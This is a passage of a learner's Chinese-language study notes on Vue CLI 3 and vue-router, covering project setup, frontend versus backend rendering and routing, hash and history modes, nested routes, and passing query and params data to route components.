   ( ) TypeScript
   ( ) Progressive Web App (PWA) Support    
   ( ) Router
   ( ) Vuex
   ( ) CSS Pre-processors
   ( ) Linter / Formatter     检测代码用的eslint
   ( ) Unit Testing
   ( ) E2E Testing
-->

- ? Where do you prefer placing config for Babel, PostCSS, ESLint, etc.? (Use arrow keys)
> In dedicated config files
  In package.json
<!-- 
  配置文件是放到独立的配置文件里 还是放在package.json里面

  老师选的是单独
-->

- ? Save this as a preset for future projects? (y/N)
<!-- 
  future 将来

  需要不需要把上面的配置保存为一个个人项目 再次通过cli3创建的时候可以选择你自己配置好的项目

  手动删除路径
  c -- users -- admin -- vuerc -- prest
 -->

- ? Save preset as:
<!-- 
  上面如果选择y的话, 会跳到这里 保存个什么名字
 -->


> 目录结构
<!-- 
  |- node_modules
  |- public       相当于cli2的static, 这里面的东西会原封不动的复制到dist里
    favicon.ico
    index.html

  |- src          源代码
    |- assets
    |- components
    App.vue
    main.js

  .browserslistrc 配置浏览器相关的东西大于市场份额的1% 最后两个版本 不考虑ie8

  .gitignore      忽略文件, 不想上传到服务器 不想给同事共享的话
  babel.config.js 

  package.json
  package-lock.json
 
  README.md
 -->

> 测试代码效果  npm run serve
> 打包文件      npm run build
<!-- 去看package.json -->

> cli3中的 main.js
<!-- 
  import Vue from 'vue'
  import App from './App.vue'

  // 在执行npm run build的时候会有一些提示信息 比如构建了什么东西
  // 发布的时候可以选成true, 在终端那里会提示你在打包什么东西
  Vue.config.productionTip = false

  new Vue({
    render: h => h(App),
  }).$mount('#app')

  // 我们在使用el:'#app'挂载app的时候 内部其实还是在执行 $mount('#app')
  // 两种写法都可以
 -->

--------------------------

### Vue Cli3 配置文件的查看和修改
- 在cli3中要想修改配置的话有三种方案

> 启动配置服务器: vue ui
- 在终端里输入 vue ui的话就会启动一个本地服务, 它帮助我们管理很多的项目
- 会弹出来一个网页, 跑在本地服务器上面的

- 创建
- 可以通过图形可视化创建一个项目

- 导入
- 我们可以通过这个选项导入我们的创建的项目, 然后左侧会出现菜单

- 仪表盘
- 插件    会显示当前装了什么插件
- 依赖    这里还可以可视化的安装依赖
- 配置    可视化的配置东西
  - 里面有css的预处理配置, 但是默认只编译css文件, postcss还需要额外的配置

- 任务
  - 这里可以可视化的运行项目


> 第二种方式:
- \node_modules\@vue\cli-service
- 这里面有个webpack.config.js 这里面导入了
  const Service = require('./lib/Service')

- 所以我们去 ./(当前文件夹) /lib/Service.js 它把配置隐藏在这里了


> 第三种方式: vue.config.js
- 在项目的根目录下创建 vue.config.js 文件 文件名固定
- 通过:
  module.exports = {

  }

- vue会把我们手写的配置和隐藏起来的配置进行合并的
 
--------------------------

### 什么路由 和其中映射关系
- 路由是一个网络工程里面的术语, routing就是通过互联的网络把信息从原地址传输到目的地址的活动
<!-- 简单的理解就是将信息从一个地方转发到另一个地方 -->

- 上面的理解还是有些抽象
- 在生活中, 我们有没有听说过路由的概念? 路由器嘛, 路由器提供了两种机制

- 路由和转送
- 路由是决定数据包从来源到目的地的路径, 转送将输入端的数据转移到合适的输出端

- 路由表
- 路由中有一个非常重要的概念叫路由表
- 路由表本质上就是一个映射表, 决定了数据包的指向

<!-- 
  猫会拉出一条网线插在路由器上, 然后我们就可以通过路由器上网, 每一台链接路由器的设备, 都会被分配到一个ip地址 比如: 192.168.1.100, 而猫本身也会有一个ip地址

  猫本身的ip地址叫做公网ip 比如202.111.23.45, 作为网址中的唯一标识

  由路由器给我们设备分配的ip叫做内网ip
  内网ip只有在当前的网络里面内网ip才是有效的, 平时我们看见的192.168.1.1之类都是用于配置内网ip地址的

  互联网中的ip地址是唯一的指的是公网ip地址, 这个地址是永远不能重复的

  比如 朋友给我发送一条 北京下雪了 它会通过双方的公网ip地址 把内容发送到我的路由器上, 
  然后通过映射表(内网ip和设备的mac地址关系的表)将信息发送到对应的设备上
 -->


### 前端渲染和后端渲染
- 说到这两个术语, 我们要从网络的发展史来说起

> 后端渲染
- 网页的渲染并不是在前端渲染出来的, 是后端那边通过一些特殊的技术在后台渲染好了, 而这个渲染的过程是在服务端渲染的, 也叫作服务端渲染

- 在很久以前开发网页的时候都是通过html+css+jsp/php
- 后端渲染对于seo会比较好

- 我们简单的看看后端渲染的流程
<!-- 
  比如我们再地址栏上输入 www.taobao.com, 这个地址就会发送到服务器里面

  早期的时候, 服务器拿到我们的地址, 会将地址进行解析看看我们要请求什么样的网页
  服务器会对发送过来的地址进行判断, 比如判断出哦~ 原来请求的是首页

  服务器就会在后台这边通过jsp的技术, 会直接将要请求的网页写好(网页中包含了htmlcssjava的代码, java的代码的作用是从数据库中读取数据并将数据动态的渲染到页面中), 也就是说我们请求的页面在服务器里就已经是一个成品网页了, 然后将这个网页直接发送给浏览器端, 这个网页中的代码只有html和css

  比如这时候我们在淘宝首页上点击了一个链接, 会跳转到另一个页面
  这个页面也会发送给服务器 服务器也会对这个url进行解析, 然后服务器在后台 通过jsp等技术在后端再次渲染出一个页面, 直接传给前端, 前端展示最终的网页

  当页面多的时候, 请求的url和后台渲染的页面会形成一个映射关系 比如
  taobao    --- 渲染出来的淘宝页面
  淘宝男装  --- 渲染出来的淘宝男装页面
  淘宝女装  --- 渲染出来的淘宝女装页面

  这种映射关系的存储和处理是服务器在帮我们处理
 -->


> 后端路由
- 后端帮我们处理url和页面之间的映射关系的, 这种就叫做后端路由
<!-- 就是看上述的映射关系是谁帮我们处理谁帮我们保存 -->

- 早期的网站开发整个html页面是由服务器来渲染的, 然后直接生产渲染好对应的html页面返回给客户端进行展示

- 但是一个网站,这么多的页面服务器如何处理? 
- 一个页面有自己对应的网址, 就是url, url会发送到服务器, 服务器就会通过正则对该url进行匹配, 并且最后交给一个Controller进行处理

- Controller进行各种处理, 最终生成html或者数据, 返回前端, 这就完成了一个io操作

- 上面的这种操作就是后端路由
- 当我们页面中需要请求不同的路径内容时, 交给服务器来进行处理, 服务器渲染好整个页面, 并且将页面返回给客户端, 这种情况下渲染好的页面, 不需要单独加载任何的js和css, 可以直接交给浏览器展示, 这样也有利于seo的优化 


> 后端路由的缺点
- 一种情况是整个页面的模块由后端人员来编写和维护的
- 另一种情况是前端开发人员如果要开发页面, 需要通过php和java等语言来编写页面代码
- 而且通常情况下html代码和数据以及对应的逻辑会混在一起, 编写和维护都是非常糟糕的事情


> 前后端分离阶段
- 随着ajax的出现, 有了前后端分离的开发模式
- 后端只提供api来返回数据, 前端通过ajax获取数据, 并且可以通过js将数据渲染到页面中

- 这样做最大的优点就是前后端责任的清晰, 后端专注于数据上, 前端专注于交互和可视化上, 并且当移动端(ios android)出现后, 后端不需要进行任何处理, 依然使用之前的一套api即可


> 前端渲染
- 浏览器中显示的网页中的大部分内容, 都是由前端的js代码在浏览器中执行, 最终渲染出来的网页

- 目前很多的网站依然采用这种模式开发
<!-- 
  前后端分离阶段

  后端只负责提供数据 不负责任何阶段的内容

                    静态资源服务器
        这里存储着我们部署到服务器上的所有网页的相关代码


  客户端(浏览器)                    服务器              数据库
                              提供api接口的服务器

      html
      css                   ↗
      js   将包含ajax代码发送到


  我们写好的代码其实都是部署到静态资源服务器

  当我们输入了url后, 其实不是直接从服务器拿东西的而是从静态资源服务器里面拿, 而我们写的所有代码都是放在静态资源服务器里面的

  从静态资源服务器里取得html css js到浏览器端, htmlcss代码浏览器可以直接渲染, js部分必须由浏览器来执行, js代码中会包含ajax请求, 浏览器执行到ajax请求后会将ajax中的url(api接口)发送 接口服务器中请求api相对应的资源

  然后接口服务器将对应的数据返回到客户端(浏览器)上

  浏览器端拿到大量的数据后, 通过js代码动态渲染到页面上
  也就是我们现在网页的渲染不是在服务器端, 而是通过ajax请求回来的数据, 在浏览器端通过js代码渲染页面
 -->


> 单页面富应用阶段
- 其实spa最主要的特点就是在前后端分离的基础上加了一层前端路由, 也就是前端来维护一套路由规则
<!-- 
                      静态资源服务器
        这里存储着我们部署到服务器上的所有网页的相关代码


  客户端(浏览器)                    服务器              数据库
                              提供api接口的服务器



  url: jd_man.com, 它也会先去静态资源服务器获取jd_man.com的html css js文件
  htmlcss直接渲染到页面中, 然后浏览器执行js代码, js代码的ajax部分去接口服务器请求数据, 然后js部分负责把请求回来的数据动态渲染到页面中 这就是第二个阶段前后端分离(通过ajax)

  下面我们再看看看第三个阶段, spa页面
 -->


> SPA 单页面富应用
- simple page webapplication, 整个网页只有一个html页面, 只有一个页面怎么行呢? 比如即有首页又有关于等页面怎么办?

<!-- 
  我们看看结构图

                    静态资源服务器
                 里面放着html+css+js


  客户端浏览器      接口服务器(api服务器)     数据库


  在前后端分离阶段:
  静态资源服务器里放着好几套html+css+js 每一套对应一个url页面, 我们开发的网站每一个网站对应着一套css html js

  url1 -- > 一套 html css js
  url2 -- > 一套 html css js
  url3 -- > 一套 html css js


  在单页面富应用阶段:
  静态资源服务器里只有一套 index.html css js 这一套里面有网站首页子页的所有信息

  我们在浏览器中输入 url, 会从静态资源服务器中把 那一套html css js下载下来
  下载下来后并不会把html css js的内容渲染到页面中

  而是根据情况, 把对应的信息抽取出来 渲染到页面里
  比如我们有三个按钮, 首页, 关于, 我的

  当我点击我的按钮时, 把我的的相关内容从html css js文件中抽离出来渲染到对应的位置

  这样即使是一套html css js也形成了三个页面, 要达到这点, 就必须有 前端路由的支撑
 -->


> 前端路由
- 其实spa最主要的特点就是在前后端分离的基础上加了一层前端路由, 也就是前端来维护一套路由规则

- 前端路由中会配置一些映射关系, 当我点击一个按钮的时候会生成一个url
<!-- 
  比如我点击首页按钮的时候 就会生成一个 url:shouye.com/home
  这时候注意, 不是像前后端分离阶段, 一旦生成url就会去静态资源服务器里请求一套htmlcssjs文件

  但是前端路由不会, 它生成的url并不会去静态资源请求资源, 它只会通过js代码的判断去我们从静态资源服务器中请求下来的数据里把相对应的资源抽离出来渲染到页面中

  比如 我们点击关于按钮, 会生成一个 url:shouye.com/about, 会根据这个url再去我们从静态资源服务器中请求下来的数据里 抽取一部分数据渲染到页面中

  其实我们抽取的这一部分资源就是相当于vue的一个组件
  比如我们之前学的webpack打包, 会把所有的组件打包在一个index.html中, 其实每一个组件就可以是一个页面, 我们把所有的组件打包在一个js文件中, 看起来是一个js, 其实这个js中包含了很多个东西

  前端会自动监听浏览器 一旦发现生成的url是这个页面 就会马上去js文件这个大的资源中, 找到这个组件的相关东西在页面上进行一个渲染
 -->

- 也就是spa页面必须有前端路由做支撑, 而前端路由就是用于映射浏览器上生成的url和main.js中到底要渲染哪一个组件的映射关系
<!-- 
  url1: www.sam.com/home    --- js组件中对应的部分
  url2: www.sam.com/about   --- js组件中对应的部分
  url3: www.sam.com/me      --- js组件中对应的部分
 -->

- 而上述的映射关系就是在前端管理所以这就叫做前端路由


> 前端路由的核心
- 改变url(在地址栏输入地址) 页面是不进行整体刷新的
<!-- 
  如果重写了url 默认是会向服务器请求新的资源的
 -->

--------------------------

### url的hash和html5的history
- 上面介绍了前端路由的概念, 它的核心就是改变url的时候让页面不要刷新
<!-- 
  因为只要改变了地址栏里的url默认 它会重新向服务器请求资源, 但现在我不让它刷新, 因为我要让它在前端这边改变
-->


> url的hash
- url的hash也就是锚点, 本质上是改变window.loacation的href属性
- 我们可以通过直接赋值location.hash来改变地址(href), 但是页面不发生刷新


> location.hash
- 我们可以通过这种方式去改变url, 实现页面不刷新
<!-- 
  当前页面: http://localhost:8080/

  通过location.hash = 'xxx'
  // 给url赋值一个hash
  location.hash = 'aaa'

  // 结果:
  http://localhost:8080/#aaa
  
  我们改变了url但是网页并没有刷新, 然后我们通过前端路由在路由表中找到映射去请求组件, 把组件在页面中进行渲染
 -->


> history.pushState()
- 我们通过这种方式改变url页面也不会刷新
- 这种方式有些像压栈和出栈
- 参数:
- {data}  状态对象, 可传空
- title   新网页的标题, 可传空
- ?url    新的网址, 必须和当前页面在同一个域

<!-- 
  history.pushState({}, '', 'home')

  // 结果
  http://localhost:8080/home
 -->

> pushState() 和 back() 相当于入栈和出栈
- 我们的栈结构相当于一个杯子, 栈只有一个入口和出口, 这里我们的pushState()方法相当于入栈, back()方法相当于把栈顶的东西移除掉

<!-- 
  history.pushState({}, '', 'home')     push  home
  history.pushState({}, '', 'about')    push  about
  history.pushState({}, '', 'me')       push  me
 -->
    |         |
    |  me     |     栈结构
    |  about  |
    |  home   |
    |_________|

<!-- 
  我们使用 pushState() 方便连续的向栈中压入了3个url
  第一次压入的会在栈底
  而我们从栈中拿数据的时候, 只能从栈顶开始拿, 所以它有个规则叫做 先进后出

  栈顶上的url也是我们地址栏上显示的最新url, 这个url永远是最后压入的

  一旦我调用history.back() 就会将栈顶的东西移除掉, 就会显示接下来在栈顶的数据, 所以push 和 back相当于入栈和出栈的操作
 -->


> history.replaceState()
- 参数跟pushState()方法中的参数一样
- 会用我们传入的url替换掉之前的url, back()方法(后退按钮将没有作用)
<!-- 
  当前url
  http://localhost:8080/home

  history.replaceState({}, '', 'about');
  http://localhost:8080/about

  但是是将http://localhost:8080/about 替换成 http://localhost:8080/home
  所以不会产生后退按钮, 没有历史记录
 -->


> history.go()
- go()方法, 只能和 pushState()方法配合使用, 因为go()方法会跳到指定的栈中的位置
- 参数是数字 
- 正数是将url压入栈中
- 负数是将url弹出栈顶

<!-- 
  history.pushState({}, '', 'home')     push  home
  history.pushState({}, '', 'about')    push  about
  history.pushState({}, '', 'me')       push  me
 -->
    |         |
    |  me     |     栈结构
    |  about  |
    |  home   |
    |_________|

<!-- 
  history.go(-1);
  弹出栈顶的me 会显示about
 -->

<!-- 
  history.go(1)   相当于 history.forward()
  history.go(-1)  相当于 history.back()
 -->

--------------------------

### 路由router
- 对于路由的理解 可以理解为 路由器和每一台电脑之间的关系 比如路由器后面的接口 就会对应着一台电脑
- 那么接口和电脑之间的关系就相当于一组组的key + value = 一组路由

- 路由和路由器的关系就是多个路由得由一个路由器进行管理
<!-- 
          路由器 router

    接口    接口    接口 route
     
     |      |       |

    电脑    电脑    电脑


    接口 + 电脑 = key + value = 路由
 -->


> 路由的概念 router
- 所谓的路由就是一组key-value的对应关系 多个路由需要经过路由器的管理
- router会监测/user的变化 然后显示对应的组件

- vue-router是一个插件库 专用用来实现spa的应用 ¥
<!-- 
 spa中的数据需要通过ajax来获取
 -->

- 既然是插件库 那么肯定需要 npm i  Vue.use()吧


> 前端路由 和 后端路由
- 前端路由：
- 理解： value是component 用于展示页面内容
- 流程： 当浏览器的路径改变的时候 对应的组件就会显示

- 后端路由：
- 理解： value是function 用于处理客户提交的请求
- 流程： 服务器收到一个请求时 根据请求路径找到匹配的函数来处理请求 返回响应数据


> 拆分html文件
- 1. 把html文件所有的内容放入到 vue的template模板中
- 2. 决定导航区和展示区的内容 将展示区的内容定义成组件

--------------------------

### 路由的基本使用
> 1. 安装 npm i vue-router

> 2. 引入安装好的VueRouter 并注册该插件 Vue.use(插件)
- 因为路由是一个插件库 所以我们要使用Vue.use()来注册一下插件
- 我们在入口文件中操作 因为入口文件里面 引入了vue
<!-- 
  import Vue from 'vue'
  import VueRouter from 'vue-router'

  // 应用插件
  Vue.use(VueRouter)
 -->

> 3. 创建路由器 配置路由规则 并导出 该router
- 我们创建一个router文件夹 里面写index.js文件 用来配置路由
- 在index.js文件中引入我们下载的vue-router并通过它创建路由器
<!-- 
  import VueRouter from 'vue-router'

  const router = new VueRouter({
    routes: [
      {},
      {},
    ]
  })
 -->

- 配置路由关系(路径和组件之间的关系) 并 暴露该router
- 使用key: value的形式 也就是 path:  component: 的形式 配置路径和组件之间的关系
<!-- 
  import About form '../components/About'

  const router = new VueRouter({
    routes: [
      {
        path: '/about',
        component: About
      }
    ]
  })

  export default router



  // 上面将routes配置到了VueRouter配置项里面 还可以这样

  const routes = [
    这里面匹配映射关系, 一个url映射一个组件...
  ]

  const router = new VueRouter({
    // 传入routes对象, 配置路由和组件之间的映射关系, 我们可以在外面放相关配置避免嵌套关系太多
    routes
  })
 -->


> 4. 将router挂载到vue实例里面 router本身就是一个配置项
<!-- 
  引入
  import router from './router'

  new Vue({
    router
  })
 -->

--------------------------

### 嵌套路由
- 一级路由 和 二级路由 如果一级路由里面再有一级路由那么它就是二级路由
- 比如 我们要创建/home/message 那么这就是一个嵌套路由 我们要将/message的逻辑写在/home的里面

> children属性
- 我们在每一个一级路由里面使用 children属性 它的值是一个数组 数组里面是对象
- 注意：
- 在写二级路由的时候 path的值里不要带/
<!-- 
  children: [
    {
      path: '/news'  这就是错的
      path: 'news'   这就是对的     二级路由不要带 / 
    }
  ]
 -->

<!-- 
  const router = new VueRouter({
    routes: [

      // 一级路由
      {
        path: '/about',
        component: About

        // 配置二级路由
        children: [
          {
            path: '直接写uri不要加斜杠 news',
            component: News
          }
        ]
      }
    ]
  })

  // 结果：
  /about/news
 -->


> 总结：
- 首先决定路由是否嵌套 就要看该组件需要通过 router-view 来展示
- 如果是 就要看 router-view 定义在哪个组件里 那么通过这个标签来展示的组件就是子组件 子组件就要定义在该组件的路由规则的children属性中
<!-- 
  // 比如 我们的 welcome 组件就要在 home 的 router-view 中展示 
  {
    path: "/home",
    component: Home,
    redirect: "/welcome",
    children:[
      {
        方式1： path里面加 / 
        代表路径为 http://localhost:8080/welcome 单开形式
        path:"/welcome",

        方式2: path里面不加 / 
        代表路径为 http://localhost:8080/home/welcome 嵌套路由形式
        path:"welcome",

        component: Welcome
      }
    ]
  },
 -->


**注意：**
- 1. vue发现一级路由中有children属性的时候会自动遍历该数组 然后自动在二级路由的前面添加 /
- 所以我们在二级路由的前面不要添加 /

- 2. 我们在<router-link to='/home/news'> 要展示二级路由的时候要带上完整的路径 也就是 一级路径/二级路径

--------------------------

### 路由配置规则 routes 中的配置项
<!-- 
  const router = new VueRouter({
    routes: [
      {
        这里有啥配置项呢
      }
    ]
  })
 -->


> name: ‘’
- 配置该路由信息的别名
- 作用：
- 让我们在多级路由跳转的时候简化编码
- 使用name的时候 要使用v-bind to 还要配合{}使用
<!-- 

  {
    name: 'xinxi'
    path: '/home/message',
    component: xxx
  }

  <router-link to='/home/message/detail'>

  我们还可以直接呼唤它的名字
  <router-link :to='{name: xinxi}'>
 -->


> path: 'uri部分'
- 监测的uri


> component: 组件
- 监测url匹配的组件


> children: [{}]
- 嵌套的路由 二级路由uri前面不用些 /


> redirect 重定向
- 当匹配到某个路径的时候我们重定向到某个组件
<!-- 
  {
    path:'/',
    redirect: '/home'
  }
 -->


> props
- 下面的写法三选1
- 对象 是路由配置文件传递的死数据传递到props中
- 布尔值 是把params参数传递到props中
- 


> 1. props的对象写法
- 对象写法 给该组件传递的是死数据 写死的
- 该对象中的所有 key value都会传递给 xxx 组件
- 以props形式传递过去的 那么该组件就会以props来接收

- 1. 路由配置文件中使用 props 配置项传递
- 2. 目标组件就要使用 props:["变量"] 来接收
- 没有接收的话 在this.$attrs 身上 如果有接收的话 就会在this身上
<!-- 
  {
    name: 'xinxi',
    path: '/home/message',
    component: xxx组件

    props: {
      key: value

      // 对象形式写的数据是死的 也就是在路由配置文件里就可以向xxx组件传递数据
      a : 1
    }
  }


  // xxx组件中 在实例中写props配置项 接收参数的参数
  {
    props: [‘a’]
  }

  接收a属性 注意这里写字符串要不去data里面找变量了
 -->


> 2. props的布尔值写法
- 若布尔值为真 就会把该路由组件收到的所有params参数 以props的形式传给xxx组件
- 该组件就可以去props中接收 别人使用params形式传递的数据
<!-- 
  {
    name: 'xinxi',
    path: '/home/message/:id/:title',
    component: xxx组件

    props: true
  }


  // xxx组件
  props: ['id', 'title']
 -->

> 3. props的函数写法
- 该函数必须有返回值 且为一个对象 该对象中的key value会以props的形式传递给xxx组件
- 该函数可以接收到 $route 参数 这样就可以整理query 和 params 把他们传递到 props 中
- 该组件就可以去props中接收
<!-- 
  {
    name: 'xinxi',
    path: '/home/message/:id/:title',
    component: xxx组件

    props($route) {
      return {
        id: $route.query.id,
        title: $route.query.title'
      }
    }
  }


  // xxx组件
  props: ['id', 'title']
 -->

--------------------------

### history模式
- 从#开始到后面的所有东西都算做路径里面的hash值
- hash最大的特点就是它不会随着http请求随着路径发给服务器

- 整个vue中有两种工作模式 hash模式 和 history模式
- 我们可以在路由的配置文件里面 添加配置项 修改 vue路由的工作模式

- 有人说 history 坑很多
- hash的兼容性比较好 history的兼容性略差

- 还有啥区别？ 一个请求资源的问题，使用hash的时候#后面不会当做请求资源发送给服务器 但是 history模式就会拿着路径去服务器的接口中请求数据
<!-- 
  localhost:8000/#/user/message
      hash模式 #/user/message 不会将这些发送给服务器请求资源

  localhost:8000/user/message
      history模式 刷新的时候 会拿着整体的路径去找接口
 -->

> 如果使用history模式的话 会有下面的问题
- 在项目上线的时候 我们项目要上线部署到服务器 那么就需要先进行打包 生成最纯粹的html css js 因为我们往服务器上放的必须是这些文件

- 比如我们可以将我们打包后的文件部署到服务器上的 static里面 当发起请求的时候 我们就给会看index.html页面
<!-- 
  但是有一个问题 我们在点击页面的时候都是通过路由来跳转的 当一刷新页面的时候就会报错 因为一刷新我就要根据路径请求资源

  首次刷新请求回来的一个页面 是 / 接口响应的
  首页的展示是 localhost:8000/

  当我点了很多路由后路径变成 localhost:8000/user/message
  由于后台没有对应的接口 就会显示404
 -->


> history怎么解决404的问题呢？
- 需要后端工程师配合 它要将路径上的资源 和 后台的所有接口进行一个匹配
- 最终决定下 哪些是前端路由的 哪些是后端路由的

- nodejs里面有一个专门用来解决 history 404问题的中间件
- nodejs 里面要安装依赖
- npm install --save connect-history-api-fallback

- https://www.npmjs.com/package/connect-history-api-fallback

- 要点：
- 1. 必须在静态资源设置前使用

<!-- 
  const express = require('express')
  const history = require('connect-history-api-fallback')
  const app = express()

  // 使用插件 它是一个函数要调用
  app.use(history());

  // history的使用必须在设置静态资源前
  app.use(express.static(__dirname+'public'))

  app.get('/', (req, res) => { 
    // 这里不用写返回首页的逻辑 好像自动去找index页面
  })
 -->

- 还可以使用nginx 它会分析我们的请求是前端路由还是后端路由


> mode: 'history'
- 该配置项跟 routes 同级别
- 通过该配置项可以修改路径的显示模式
<!-- 
  const router = new VueRouter({
    routes,
    mode: 'history'
  })
 -->
 

> 总结
- hash模式：
- 1. 地址栏中永远带着#号 不美观
- 2. 若以后将地址通过第三方收集app分享 若app校验严格 则地址会被标记为不合法
- 3. 兼容性好

- history模式
- 1. 地址干净 美观
- 2. 兼容性和hash模式相比略差
- 3. 应用部署上线时候需要后端人员支持，解决刷新页面服务器端404的问题

- 路由配置文件中使用 props 传递数据
- 1. 数据是死的
- 2. 目标组件要使用props来声明接收
- 3. 没有接收的数据 在 $attrs 身上

--------------------------

### <router-link> 和 <router-view>
- 上面已经配置到了路由的规则 现在我们完成点击标签更改路径 和 匹配组件的逻辑
<!-- 
  原始html中使用a标签实现页面的跳转
 -->

- 但是在vue中我们不能使用a标签来进行跳转而是要使用vue-router这个库给我们提供的专用标签router-link标签实现路由的切换


> <router-link to='uri接口部分 /user' active-class=''>
- <router-link> 是vue-router插件库给我们提供修改路径的方式
- 属性：
  - to:   我们希望将路径改成什么样子 /路径
  - active-class：
          该元素被激活时候的样式 值为类名 原本的class照常写
<!-- 
  可以理解为<a>标签, 
  是vue-router中注册过的组件, 这两个组件是全局组件可以在任何的文件中用, 
  <router-link>最终会被渲染成<a>
  
  可以将url中的地址改成 to后面的值, 这样当地址栏中出现/home的时候就会映射到对应的组件上
 -->


> <router-link replace>
- 作用：
- 控制路由跳转时操作浏览器历史记录的模式

- 浏览器的历史记录有两种写入方式： 分别为push 和 replace push是追加历史记录 replace是替换当前记录 路由跳转时候默认为push
<!-- 
  - 我们每一次点击后退都会留下历史记录 
  - 浏览器是一个栈结构 我们每次点击一个链接后 都会将该记录压入栈
  - 后点的会在最上方 栈中有一个指针始终指向栈顶

  - 历史记录操作的push模式
  - 每当我们点击一次后退的时候指针就会下移一位 前进和后退就是一个操作指针的过程
  - 我们通过<router-link>跳转的链接 每一次点击都会留下历史记录 默认是push操作 就是可以依次回退
 -->

- 它最大的特点就是替换当前栈顶的那一条 每次点击一次链接后 都会替换掉上一条 也就是说栈里面始终只有一条
- 它不会能回退


> <router-view>
- 该标签决定 路由匹配的组件在哪个区域展示
- 我们可以在template的html结构中定好这个区域 然后直接将router-view丢进去就可以了
<!-- 
  也就是通过css来定结构 然后router-view决定组件在哪里呈现
 -->


> 举例：
- <router-link> 标签中的 to属性
- 可以将url中的地址改成 to后面的值, 这样当地址栏中出现/home的时候就会映射到对应的组件上
<!-- 
  <router-link to='/home'>首页</router-link>
  http://localhost:8080/#/home
 -->


- <router-view>
- 决定要被渲染的组件, 在什么位置的
- 某个组件渲染之后会替代<router-view>的位置, 相当于占位的

<!-- 
  在页面上创建两个标签, 当点击home的时候显示home的组件, 当点击about的时候显示about的组件
  <template>
    <div id="app">
      <router-link to='/home'>首页</router-link>
      <router-link to='/about'>关于</router-link>
    </div>
  </template>

  页面中会出现 两个链接, 每点击一个链接会出现
  首页 关于

  http://localhost:8080/#/home
  http://localhost:8080/#/about

  一旦点击链接按钮后地址栏变为对应地址应该在页面中的某一个区域内显示出来

  <template>
    <div id="app">
      <router-link to='/home'>首页</router-link>
      <router-link to='/about'>关于</router-link>

      <router-view></router-view>
    </div>
  </template>
 -->


**注意：**
- 切换掉的组件 其实是被销毁了 比如我们从a切换到了b 展示的b 那么a组件就被销毁了
- 在路由切换时, 切换的是<router-view>挂载的组件, 其它内容不会发生改变


> 路由组件和一般组件
- 一般组件： 我们自己写的 组件标签 展现的组件
- 路由组件： 通过监测路径的变化 vue-router 自己匹配的组件 在router-view里面呈现

- 一般组件 一般放在components文件夹中
- 路由组件 一般放在pages文件夹中


> 路由组件上特有的对象
> $router $route


> $router
- 当我们导入Vuerouter后整个应用就会多出一个 $router 且只有一个 所有的路由都归它管


> $route
- 每一个组件都有自己的 $route 理由存储的是自己的路由信息 里面还有vue-router添加进去的一些属性
- 每一个组件的$route都是不一样的(值不一样)

- 表示当前激活的路由的状态信息，包含了当前 URL 解析得到的信息, 还有 URL 匹配到的 route records（路由记录）。

- 1. $route.path
- 字符串，对应当前路由的路径，总是解析为绝对路径，如 "/foo/bar"。

- 2. $route.params
- 一个 key/value 对象，包含了 动态片段 和 全匹配片段，
- 如果没有路由参数，就是一个空对象。

- 3. $route.query
- 一个 key/value 对象，表示 URL 查询参数。
- 例如，对于路径 /foo?user=1，则有 $route.query.user == 1，
- 如果没有查询参数，则是个空对象。

- 4. $route.hash
- 当前路由的 hash 值 (不带 #) ，如果没有 hash 值，则为空字符串。锚点

- 5. $route.fullPath
- 完成解析后的 URL，包含查询参数和 hash 的完整路径。

- 6. $route.matched
- 数组，包含当前匹配的路径中所包含的所有片段所对应的配置参数对象。

- 7. $route.name    当前路径名字

- 8. $route.meta  路由元信息

--------------------------

### 路由传参 --- query 参数
- 说个小案例：
- 页面上有3个按钮 我们点击按钮 展示该按钮对应的详情
- 但是详情页面只是一个组件 也就是我们 我们要用这一个组件展示3个按钮对应的不同内容
- 比如这个展示区要展示 id title

- 思路：
- 由于数据在按钮的组件当中 那我们是不是可以在点击按钮的时候 向路由组件传递数据 将详情组件想要展示的东西传递过去

- 路由能接收两种参数


> 传递 query 参数
> /user?id=666&title=你好呀
- 我们可以在路径中使用?的形式带着参数过去
<!-- 
  // 向detail组件传递参数
  <router-link to='/home/message/detail?id=666&title=你好呀'>
 -->

- 接收参数：
- 我们可以通过 this.$route.query 接收到 它是一个对象
<!-- 
  this.$route.query = {
    id: "666",
    title: "你好呀"
  }

  this.$route.query.name
 -->


> 跳转路由 并 携带query参数的 to的字符串的写法
> <router-link :to='`/home/message/detail?id=${item.id}&title=${item.title}`'>
<!-- 
  <router-link to='/home/message/detail?id=item.id&title=item.title'>
      注意 item.id item.title 会当做字符串去解析

  <router-link :to='`/home/message/detail?id=${item.id}&title=${item.title}`'>
      我们使用 v-bind 和 模板字符串混着用
      外侧的引号是里面 会当做js去解析 js发现里面是模板字符串
 -->

> 跳转路由 并 携带query参数的 :to的对象写法
- 要点：
- :to的前面要写 v-bind 代表我要写一个对象
<!-- 
  <router-link :to='{
    path:'/home/message/detail',
    query: {
      id: item.id,
      title: item.title
    }
  }'>
 -->

> detail组件接收参数
> this.$route.query
- <router-link to> 中传递参数 匹配的路由组件就要接收参数 
- $route里面是路由的各种信息里面有一个query对象用于接收向该组件传递的query参数
<!-- 
  // 模板中可以直接使用
  <li>{{$route.query.id}}</li>
  <li>{{$route.query.title}}</li>
 -->



> 传递 params 参数
> 字符串类型的写法
- 1. 把我们想传递的参数直接拼接到url中
- 要点：
- 要使用 v-bind:to 里面有变量的时候 要普通冒号 包裹 模板字符串的方式
<!-- 
  <router-link :to='`/home/message/detail/666/你好啊`'>
 -->

- 2. 在路由配置文件中的path属性里面 声明该组件要接收什么数据
<!-- 
  {
    path: 'detail/:id/:data'
  }
 -->

- 3. 该组件在获取数据的时候 从 $route.params 身上获取 id 和 data数据
- params: {id: "8"}


> 对象的写法
- 如果我们使用对象的写法 就不能用path 必须使用组件路由配置中的name别名
<!-- 
  <router-link :to='{
    path:'/home/message/detail',      错的 不能用path 要使用name

    name:'组件的别名',
    params: {
      id: item.id,
      title: item.title
    }
  }'>
 -->


**注意：**
- 模板中可以直接使用 $route 但是实例中要通过this获取

--------------------------

### 路由的props配置
- 上面我们说了怎么给路由组件传递数据 有 query 和 params 方式
- 但是这个路由组件在使用的时候 比较麻烦
<!--  
  <router-link to='/home?id=6&title=sam&age=18'>

  // 那home组件在使用这些数据的时候就会这样
  $route.query.id
  $route.query.title
  $route.query.age
 -->

- 少还可以 多了的情况下就会变的非常的繁琐
- 这时候我们就可以去 路由的配置文件中 传入 props 配置项 来配置这些传递过来的数据

- 我们可以选择 路由的props配置项的函数形式这样它可以整理好数据的格式 query params都可以传递到组件的props中
<!-- 
  {
    props($route) {
      return {
        id: $route.query.id
      }
    }
  }
 -->

--------------------------

